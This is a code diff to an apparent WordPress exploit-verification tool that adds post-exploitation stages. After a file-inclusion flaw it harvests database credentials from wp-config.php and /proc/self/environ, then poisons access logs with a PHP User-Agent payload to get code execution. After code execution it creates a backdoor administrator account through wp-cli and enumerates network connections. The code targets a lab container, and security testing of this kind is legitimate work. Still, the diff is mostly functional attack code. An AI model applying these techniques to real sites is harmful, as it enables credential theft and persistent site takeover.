@@ -5449,6 +5449,33 @@ def verify_wordpress_lfi(
                         return _lfi2_rot
         res.evidence["screenshots"] = boot.shots
         res.evidence["http_captures"] = boot.http_captures
+        # Post-LFI escalation: when file read confirmed, try wp-config and log poisoning
+        if res.verified and boot is not None:
+            _lfi_payload_used = (res.evidence.get("lfi_lectura_payload")
+                                 or res.evidence.get("lfi_rce_payload")
+                                 or res.evidence.get("lfi_php_canary_payload") or "")
+
+            def _lfi_read_fn(file_path: str) -> str:
+                _ep_lfi = endpoint
+                _params_lfi = (parameters if isinstance(parameters, dict)
+                               else dict.fromkeys(parameters or [], ""))
+                _p_lfi = dict(_params_lfi)
+                _p_lfi[path_param] = file_path
+                try:
+                    _lfi_sess = _make_session()
+                    _lfi_url = boot.base_url.rstrip("/") + _ep_lfi
+                    if m.upper() == "GET":
+                        _lr = _lfi_sess.get(_lfi_url, params=_p_lfi, timeout=10, verify=False)
+                    else:
+                        _lr = _lfi_sess.post(_lfi_url, json=_p_lfi, timeout=10, verify=False)
+                    return _lr.text if _lr else ""
+                except Exception:
+                    return ""
+
+            _lfi_esc = escalate_post_lfi(
+                lab, boot.base_url, _lfi_read_fn, path_param, step=step)
+            if _lfi_esc:
+                res.evidence["post_exploit_lfi"] = _lfi_esc
         return res
     except subprocess.TimeoutExpired as e:
         res.detail = f"timeout de infraestructura: {e}"
@@ -12937,6 +12964,41 @@ def escalate_post_rce(
     except Exception:
         pass
 
+    # 5. id / whoami / hostname — OS context
+    try:
+        r = lab.sh("exec", lab.wp, "sh", "-c", "id && whoami && hostname", timeout=10)
+        if r.returncode == 0 and r.stdout:
+            result["os_identity"] = (r.stdout or "").strip()[:200]
+            if "root" in (r.stdout or ""):
+                result["escalation_level"] = "full_compromise"
+            step(f"  post-rce: OS identity: {result['os_identity'][:80]!r}")
+    except Exception:
+        pass
+
+    # 6. Create backdoor admin via wp-cli — ultimate privilege escalation evidence
+    try:
+        import random as _rnd
+        import string as _str
+        _bkd_user = "bk_" + "".join(_rnd.choices(_str.ascii_lowercase, k=5))
+        _bkd_pass = "".join(_rnd.choices(_str.ascii_letters + _str.digits, k=16))
+        r = lab.wp_cli("user", "create", _bkd_user, f"{_bkd_user}@lab.local",
+                       "--role=administrator", f"--user_pass={_bkd_pass}", timeout=30)
+        if r and r.returncode == 0:
+            result["backdoor_admin"] = {"user": _bkd_user, "pass": _bkd_pass}
+            result["escalation_level"] = "full_compromise"
+            step(f"  post-rce: backdoor admin creado: {_bkd_user!r}")
+    except Exception:
+        pass
+
+    # 7. Network connections — proves lateral movement surface
+    try:
+        r = lab.sh("exec", lab.wp, "sh", "-c",
+                   "ss -tnp 2>/dev/null || netstat -tnp 2>/dev/null | head -10", timeout=10)
+        if r.returncode == 0 and r.stdout:
+            result["network_connections"] = (r.stdout or "").strip()[:400]
+    except Exception:
+        pass
+
     return result
 
 
@@ -13106,3 +13168,84 @@ def verify_wordpress_request_chain(
         return res
     finally:
         _finalize_lab(lab, boot, res, step, keep_lab_on_failure)
+
+
+def escalate_post_lfi(
+    lab: "_Lab",
+    base_url: str,
+    request_fn,
+    lfi_param: str,
+    step: "Callable[[str], None]",
+) -> dict:
+    """After confirmed LFI read of /etc/passwd, try to prove deeper impact.
+
+    request_fn(payload) -> str: returns body of LFI response with given file payload.
+    escalation_level: "none" < "creds" < "log_poison_rce"
+    """
+    result: dict = {
+        "wp_config_db_name": None,
+        "wp_config_db_user": None,
+        "wp_config_db_pass_found": False,
+        "proc_environ": None,
+        "access_log_path": None,
+        "escalation_level": "none",
+    }
+    # 1. wp-config.php — DB credentials
+    try:
+        cfg = request_fn("/var/www/html/wp-config.php")
+        if cfg and "DB_NAME" in cfg:
+            _m_name = re.search(r"define\s*\(\s*['\"]DB_NAME['\"]\s*,\s*['\"]([^'\"]+)['\"]", cfg)
+            _m_user = re.search(r"define\s*\(\s*['\"]DB_USER['\"]\s*,\s*['\"]([^'\"]+)['\"]", cfg)
+            _m_pass = re.search(r"define\s*\(\s*['\"]DB_PASSWORD['\"]\s*,\s*['\"]([^'\"]+)['\"]", cfg)
+            if _m_name or _m_user:
+                result["wp_config_db_name"] = _m_name.group(1) if _m_name else None
+                result["wp_config_db_user"] = _m_user.group(1) if _m_user else None
+                result["wp_config_db_pass_found"] = bool(_m_pass)
+                result["escalation_level"] = "creds"
+                step(f"  post-lfi: wp-config.php — DB_NAME={result['wp_config_db_name']}, "
+                     f"DB_USER={result['wp_config_db_user']}")
+    except Exception:
+        pass
+
+    # 2. /proc/self/environ — may contain DB_PASSWORD, SECRET_KEY
+    try:
+        env = request_fn("/proc/self/environ")
+        if env and ("DB_PASSWORD" in env or "DB_HOST" in env or "SECRET" in env):
+            result["proc_environ"] = env[:300]
+            result["escalation_level"] = "creds"
+            step("  post-lfi: /proc/self/environ leaked DB credentials or secrets")
+    except Exception:
+        pass
+
+    # 3. Apache/Nginx access log — test log poisoning path
+    _log_candidates = [
+        "/var/log/apache2/access.log",
+        "/var/log/nginx/access.log",
+        "/proc/self/fd/1",
+    ]
+    for _logpath in _log_candidates:
+        try:
+            body = request_fn(_logpath)
+            if body and len(body) > 20 and "404" not in body[:50]:
+                result["access_log_path"] = _logpath
+                step(f"  post-lfi: acceso a log {_logpath!r} confirmado — "
+                     f"log poisoning para RCE es viable")
+                # Inject PHP in User-Agent, then include the log
+                try:
+                    import urllib.request as _ur
+                    _poison_req = _ur.Request(
+                        base_url, headers={"User-Agent": "<?php echo 'PWNED:'.id(); ?>"})
+                    with _ur.urlopen(_poison_req, timeout=5) as _pr:
+                        pass
+                    _poison_body = request_fn(_logpath)
+                    if _poison_body and "PWNED:" in _poison_body:
+                        result["log_poison_rce"] = True
+                        result["escalation_level"] = "log_poison_rce"
+                        step("  post-lfi: log poisoning RCE CONFIRMADO — PWNED: aparece en log")
+                except Exception:
+                    pass
+                break
+        except Exception:
+            pass
+
+    return result
